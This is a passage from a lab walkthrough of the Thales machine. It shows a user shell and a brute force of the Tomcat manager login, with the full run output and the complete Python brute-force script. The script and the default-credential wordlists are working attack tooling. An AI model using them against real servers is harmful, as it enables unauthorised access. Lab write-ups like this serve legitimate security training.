thales@miletus:/$ whoami;id;hostname
whoami;id;hostname
thales
uid=1000(thales) gid=1000(thales) groups=1000(thales),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
miletus
thales@miletus:/$ 
```
It worked... to gain access to the user. The route to root is the same as written above by using the backup.sh file to gain privileges as root.

## Alternative Tomcat Manager Brute Force
I was not happy using the msfconsole to brute force the Tomcat manager. The option to use Hydra was still not working for me. So I decided to look further with some Google Fu, I had found a [potential script](https://gist.github.com/th3gundy/d562eb1ae5dc42d666d3aab761bd4d96). I copied the script to a new file and looked into the source code to see what is was doing before I run the script.

To use the script I only had to specify a few arguments. The command should look like this:
**python brute-tomcat-manager.py --host 10.0.2.6 --port 8080 --path /manager/html --usr /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt --pwd /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt**


```bash
┌──(emvee㉿kali)-[~/Documents/thales]
└─$ python brute-tomcat-manager.py --host 10.0.2.6 --port 8080 --path /manager/html --usr /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt --pwd /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt   
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
# Target: http://10.0.2.6:8080/manager/html
# Usernames: /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt
# Passwords: /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt
# Press any key to start ...
[*] Trying 'admin:admin' ...
[*] Trying 'manager:admin' ...
[*] Trying 'role1:admin' ...
[*] Trying 'role:admin' ...
[*] Trying 'root:admin' ...
[*] Trying 'tomcat:admin' ...
[*] Trying 'both:admin' ...
[*] Trying 'QCC:admin' ...
[*] Trying 'j2deployer:admin' ...
[*] Trying 'ovwebusr:admin' ...
[*] Trying 'cxsdk:admin' ...
[*] Trying 'ADMIN:admin' ...
[*] Trying 'xampp:admin' ...
[*] Trying 'admin:manager' ...
[*] Trying 'manager:manager' ...
[*] Trying 'role1:manager' ...
[*] Trying 'role:manager' ...
[*] Trying 'root:manager' ...
[*] Trying 'tomcat:manager' ...
[*] Trying 'both:manager' ...
[*] Trying 'QCC:manager' ...
[*] Trying 'j2deployer:manager' ...
[*] Trying 'ovwebusr:manager' ...
[*] Trying 'cxsdk:manager' ...
[*] Trying 'ADMIN:manager' ...
[*] Trying 'xampp:manager' ...
[*] Trying 'admin:role1' ...
[*] Trying 'manager:role1' ...
[*] Trying 'role1:role1' ...
[*] Trying 'role:role1' ...
[*] Trying 'root:role1' ...
[*] Trying 'tomcat:role1' ...
[!] Credentials found: tomcat:role1
[*] Trying 'both:role1' ...
[*] Trying 'QCC:role1' ...
[*] Trying 'j2deployer:role1' ...
[*] Trying 'ovwebusr:role1' ...
[*] Trying 'cxsdk:role1' ...
[*] Trying 'ADMIN:role1' ...
[*] Trying 'xampp:role1' ...
[*] Trying 'admin:role' ...
[*] Trying 'manager:role' ...
[*] Trying 'role1:role' ...
[*] Trying 'role:role' ...
[*] Trying 'root:role' ...
[*] Trying 'tomcat:role' ...
[*] Trying 'both:role' ...
[*] Trying 'QCC:role' ...
[*] Trying 'j2deployer:role' ...
[*] Trying 'ovwebusr:role' ...
[*] Trying 'cxsdk:role' ...
[*] Trying 'ADMIN:role' ...
[*] Trying 'xampp:role' ...
[*] Trying 'admin:root' ...
[*] Trying 'manager:root' ...
[*] Trying 'role1:root' ...
[*] Trying 'role:root' ...
[*] Trying 'root:root' ...
[*] Trying 'tomcat:root' ...
[*] Trying 'both:root' ...
[*] Trying 'QCC:root' ...
[*] Trying 'j2deployer:root' ...
[*] Trying 'ovwebusr:root' ...
[*] Trying 'cxsdk:root' ...
[*] Trying 'ADMIN:root' ...
[*] Trying 'xampp:root' ...
[*] Trying 'admin:tomcat' ...
[*] Trying 'manager:tomcat' ...
[*] Trying 'role1:tomcat' ...
[*] Trying 'role:tomcat' ...
[*] Trying 'root:tomcat' ...
[*] Trying 'tomcat:tomcat' ...
[*] Trying 'both:tomcat' ...
[*] Trying 'QCC:tomcat' ...
[*] Trying 'j2deployer:tomcat' ...
[*] Trying 'ovwebusr:tomcat' ...
[*] Trying 'cxsdk:tomcat' ...
[*] Trying 'ADMIN:tomcat' ...
[*] Trying 'xampp:tomcat' ...
[*] Trying 'admin:both' ...
[*] Trying 'manager:both' ...
[*] Trying 'role1:both' ...
[*] Trying 'role:both' ...
[*] Trying 'root:both' ...
[*] Trying 'tomcat:both' ...
[*] Trying 'both:both' ...
[*] Trying 'QCC:both' ...
[*] Trying 'j2deployer:both' ...
[*] Trying 'ovwebusr:both' ...
[*] Trying 'cxsdk:both' ...
[*] Trying 'ADMIN:both' ...
[*] Trying 'xampp:both' ...
[*] Trying 'admin:QCC' ...
[*] Trying 'manager:QCC' ...
[*] Trying 'role1:QCC' ...
[*] Trying 'role:QCC' ...
[*] Trying 'root:QCC' ...
[*] Trying 'tomcat:QCC' ...
[*] Trying 'both:QCC' ...
[*] Trying 'QCC:QCC' ...
[*] Trying 'j2deployer:QCC' ...
[*] Trying 'ovwebusr:QCC' ...
[*] Trying 'cxsdk:QCC' ...
[*] Trying 'ADMIN:QCC' ...
[*] Trying 'xampp:QCC' ...
[*] Trying 'admin:j2deployer' ...
[*] Trying 'manager:j2deployer' ...
[*] Trying 'role1:j2deployer' ...
[*] Trying 'role:j2deployer' ...
[*] Trying 'root:j2deployer' ...
[*] Trying 'tomcat:j2deployer' ...
[*] Trying 'both:j2deployer' ...
[*] Trying 'QCC:j2deployer' ...
[*] Trying 'j2deployer:j2deployer' ...
[*] Trying 'ovwebusr:j2deployer' ...
[*] Trying 'cxsdk:j2deployer' ...
[*] Trying 'ADMIN:j2deployer' ...
[*] Trying 'xampp:j2deployer' ...
[*] Trying 'admin:ovwebusr' ...
[*] Trying 'manager:ovwebusr' ...
[*] Trying 'role1:ovwebusr' ...
[*] Trying 'role:ovwebusr' ...
[*] Trying 'root:ovwebusr' ...
[*] Trying 'tomcat:ovwebusr' ...
[*] Trying 'both:ovwebusr' ...
[*] Trying 'QCC:ovwebusr' ...
[*] Trying 'j2deployer:ovwebusr' ...
[*] Trying 'ovwebusr:ovwebusr' ...
[*] Trying 'cxsdk:ovwebusr' ...
[*] Trying 'ADMIN:ovwebusr' ...
[*] Trying 'xampp:ovwebusr' ...
[*] Trying 'admin:cxsdk' ...
[*] Trying 'manager:cxsdk' ...
[*] Trying 'role1:cxsdk' ...
[*] Trying 'role:cxsdk' ...
[*] Trying 'root:cxsdk' ...
[*] Trying 'tomcat:cxsdk' ...
[*] Trying 'both:cxsdk' ...
[*] Trying 'QCC:cxsdk' ...
[*] Trying 'j2deployer:cxsdk' ...
[*] Trying 'ovwebusr:cxsdk' ...
[*] Trying 'cxsdk:cxsdk' ...
[*] Trying 'ADMIN:cxsdk' ...
[*] Trying 'xampp:cxsdk' ...
[*] Trying 'admin:ADMIN' ...
[*] Trying 'manager:ADMIN' ...
[*] Trying 'role1:ADMIN' ...
[*] Trying 'role:ADMIN' ...
[*] Trying 'root:ADMIN' ...
[*] Trying 'tomcat:ADMIN' ...
[*] Trying 'both:ADMIN' ...
[*] Trying 'QCC:ADMIN' ...
[*] Trying 'j2deployer:ADMIN' ...
[*] Trying 'ovwebusr:ADMIN' ...
[*] Trying 'cxsdk:ADMIN' ...
[*] Trying 'ADMIN:ADMIN' ...
[*] Trying 'xampp:ADMIN' ...
[*] Trying 'admin:xampp' ...
[*] Trying 'manager:xampp' ...
[*] Trying 'role1:xampp' ...
[*] Trying 'role:xampp' ...
[*] Trying 'root:xampp' ...
[*] Trying 'tomcat:xampp' ...
[*] Trying 'both:xampp' ...
[*] Trying 'QCC:xampp' ...
[*] Trying 'j2deployer:xampp' ...
[*] Trying 'ovwebusr:xampp' ...
[*] Trying 'cxsdk:xampp' ...
[*] Trying 'ADMIN:xampp' ...
[*] Trying 'xampp:xampp' ...
## Summary ##
{'tomcat': 'role1'}
```
When the script has finished running, the credentials are found and listed at the bottem.

The source code for the file tomcat.py which I copied from the Github Gist.
```python
"""
    Tomcat bruteforce
    Author: @itsecurityco
"""

import os
import sys
import getopt
import base64
import requests
from time import sleep

def usage():
    print "## Usage ##"
    print "tomcat.py --host 127.0.0.1 --port <8080> --path </manager/html> --usr path_file --pwd path_file"

def info(host, port, path, usr_path, pwd_path):
    print "# Target: http://%s:%d%s" % (host, port, path)
    print "# Usernames: %s" % usr_path
    print "# Passwords: %s" % pwd_path
    raw_input("# Press any key to start ...")

def log(log_file):
    if os.path.isfile(log_file):
        handle = open(log_file, "r")
        session = handle.read().strip().split("::::::")
        handle.close()
        os.remove(log_file)
        return session
    else:
        return False

def bruteforce(host, port, path, usr_path, pwd_path, log_file):
    usernames = open(usr_path, 'r').read().splitlines()
    passwords = open(pwd_path, 'r').read().splitlines()
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Cache-Control": "max-age=0"}
    session = log(log_file)
    creds = {}

    for pwd in passwords:
        for usr in usernames:
            if session != False:
                if session[0] == usr and session[1] == pwd:
                    print "# Reading %s file from '%s:%s' " % (log_file, usr, pwd)
                    session = False
                    sleep(5)
                else:
                    continue

            headers["Authorization"] = "Basic %s" % base64.b64encode("%s:%s" % (usr, pwd))
            print "[*] Trying '%s:%s' ..." % (usr, pwd)
            try:
                res = requests.get("http://%s:%d%s" % (host, port, path), headers=headers)
                if res.status_code != 401:
                    print "[!] Credentials found: %s:%s" % (usr, pwd)
                    creds[usr] = pwd    
            except:
                handle = open(log_file, "w")
                handle.write("%s::::::%s" % (usr, pwd))
                handle.close()

    if len(creds) > 0:
        print "## Summary ##"
        print creds
    else:
        print "## No passwords found ##"

def main():
    port = 8080 
    path = "/manager/html"
    log_file = "tomcat.log"
    
    try:
        opts, args = getopt.getopt(sys.argv[1:], "h", ["help", "host=", "port=", "path=", "usr=", "pwd="])
    except getopt.GetoptError as err:
        print str(err)
        usage()
        exit(1)
    
    for opt, arg in opts:
        if opt in ("-h", "--help"):
            usage()
            exit(0)
        elif opt == "--host":
            host = arg
        elif opt == "--port":
            port = int(arg)
        elif opt == "--path":
            path = arg
        elif opt == "--usr":
            usr_path = arg
        elif opt == "--pwd":
            pwd_path = arg
        else:
            assert False, "unhandled option"
    
    if len(opts) == 0:
     usage()
     exit(0)

    info(host, port, path, usr_path, pwd_path)
    bruteforce(host, port, path, usr_path, pwd_path, log_file)

if __name__ == "__main__":
    main()
```